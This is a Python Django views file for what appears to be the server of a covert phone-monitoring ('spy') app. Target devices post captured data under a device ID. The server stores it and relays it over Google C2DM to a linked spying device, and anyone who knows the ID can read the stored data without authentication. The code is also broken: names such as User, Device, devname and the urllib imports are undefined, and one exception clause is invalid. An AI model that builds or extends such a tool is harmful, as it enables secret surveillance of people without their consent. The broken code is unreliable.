import logging
logging.getLogger().setLevel(logging.DEBUG)
from django.http import HttpResponse, HttpResponseNotFound, HttpResponseRedirect, HttpResponseBadRequest, HttpResponseServerError
from django.utils import simplejson
from django.shortcuts import get_object_or_404
from django.core.urlresolvers import reverse
from google.appengine.api import users

C2DMUSER = "droidfiledrop@gmail.com"
KEY_DEV_NAME = "devname"


class RequireGAEAuth(object):
    #Wrap a View to require authentication and pass the current GAE user
    def __init__(self, func):
        self.func = func

    def __call__(self, request, **kwargs):
        user = users.get_current_user()
        if not user:
            #make them login
            logging.info("No user logged in: redirecting..")
            return HttpResponseRedirect(users.create_login_url(request.get_full_path()))
        else:
            logging.info("User %s logged in!" % user.nickname())
            return self.func(user, request, kwargs)

class RequireAFDUser(object):
    #Wrap a View to require authentication and pass the current AFD user
    def __init__(self, func):
        self.func = func

    def __call__(self,  request, **params):
        #TODO Eliminate duplication with RequireGAEAuth
        user = users.get_current_user()
        if not user:
            #make them login
            return HttpResponseRedirect(users.create_login_url(request.get_full_path()))
        else:
            try:
                user = User.objects.get(userid = user.user_id())
            except User.DoesNotExist:
                return HttpResponse("No devices registered")
            else:
                return self.func(user, request, params)

from models import TargetDevice, SpyInfo, C2DMInfo

def spy(request, devid=None):
    """
    POSTs a new piece of data
    GETS data for a particular target
    """

    if request.method == "GET":
        try:
            targetDevice = TargetDevice.objects.get(Uuid = devid)
        except TargetDevice.DoesNotExist:
            return HttpResponse("No Such Device", content_type="text/plain")
        
        infos = SpyInfo.objects.filter(device = targetDevice)
        if not infos :
            
            return HttpResponse("UUIDBad Request", content_type="text/plain")
        #print "we shouldn't get here"


        return direct_to_template(request, "api/spy.html", {'info_list' : infos})

    elif request.method == "POST":
        logging.info("a spy POST")

        if not devid:
            #Why u no provide ID?
            return HttpResponseBadRequest("Bad Request", content_type="text/plain")

        title = request.POST.get("title", "title")
        text = request.POST.get("text","text")
        logging.info("Title: " + title)
        logging.info("Text: " + text)
        try:
            #this  TargetDevice is not new
            device = TargetDevice.objects.get(Uuid = devid)
            logging.info("Welcome back.." + devid)
        except TargetDevice.DoesNotExist:
            device = TargetDevice(Uuid = devid)
            logging.info("This is a new device: " + devid)
            device.save()

        info = SpyInfo(device = device, title = title, text = text)
        info.save()
        
        #Notify listeners for this device
        notify(info)

        return HttpResponse("Notified")

    elif request.method == "DELETE":

        #delete given device
        try:
            device = TargetDevice.objects.get(Uuid = devid)
        except Device.DoesNotExist:
            return HttpResponseBadRequest("Device does not exist")
        device.delete()

        try:
            device = Device.objects.get(user = user)
        except Device.DoesNotExist:
            #Delete user if last device
            user.delete()
        return HttpResponse("Device %s deleted" % devname)



    else:
        return HttpResponse("Bad Request", content_type="text/plain")


from django.core.urlresolvers import reverse
from django.views.generic.simple import direct_to_template

def notify(info):

    try:
        spy = info.device.spy
    except e:
        #Nobody is spying on this target
        print e
        return HttpResponseNotFound("No such device")

    logging.info("Notifying device %s" % (spy))

    try:
        c2dmUser = C2DMInfo.objects.get(user=C2DMUSER)
        authToken = c2dmUser.authtoken
    except C2DMInfo.DoesNotExist:
        return HttpResponseServerError("Error!")

    try:
        return notifyHelper(spy,info,authToken)
    except urllib2.HTTPError, e:
        #Token expired, get a new one
        if e.code == 401:
            logging.error("Auth expired")
            newToken = get_google_authtoken(c2dmUser.user, c2dmUser.password)
            logging.error("new token: " + newToken)
            c2dmUser.authtoken = newToken
            c2dmUser.save()
            return notifyHelper(spy, info, authtoken)
        else:
            raise



def notifyHelper(spy, info, authtoken):
    responses = []
    values = {
            'data.title' : info.title, # info title
            'data.text' : info.text, # info text
            'registration_id' : device.c2dmid,
            'collapse_key' : "akey" #doesn't mean anything. we're tiny
            }
    body = urllib.urlencode(values)
    request = urllib2.Request('http://android.clients.google.com/c2dm/send', body)
    request.add_header('Authorization', 'GoogleLogin auth=' + authtoken)
    response = urllib2.urlopen(request) 
    logging.info("Notified %s UUID: %s" % (spy.C2DMID, spy.Uuid))
    logging.info("Response Code: " + str(response.code))
    responses.append(response)

    returnResponse = HttpResponse("OK!")
    for response in responses:
        if (response.code != 200):
            returnResponse = HttpResponse("There was an error in the C2DM process")
    return returnResponse






def get_google_authtoken(email_address, password):
    """
    Make secure connection to Google Accounts and retrieve an authorisation
    token for the stated appname.
    """
    #opener = get_opener()

    # get an AuthToken from Google accounts
    auth_uri = 'https://www.google.com/accounts/ClientLogin'
    authreq_data = urllib.urlencode({ "Email":   email_address,
        "Passwd":  password,
        "service": "ac2dm",
        "source":  "sospyer",
        "accountType": "HOSTED_OR_GOOGLE" })
    req = urllib2.Request(auth_uri, data=authreq_data)
    response = urllib2.urlopen(req)
    #response = opener.open(req)
    response_body = response.read()
    response_dict = dict(x.split("=")
            for x in response_body.split("\n") if x)
    return response_dict["Auth"]


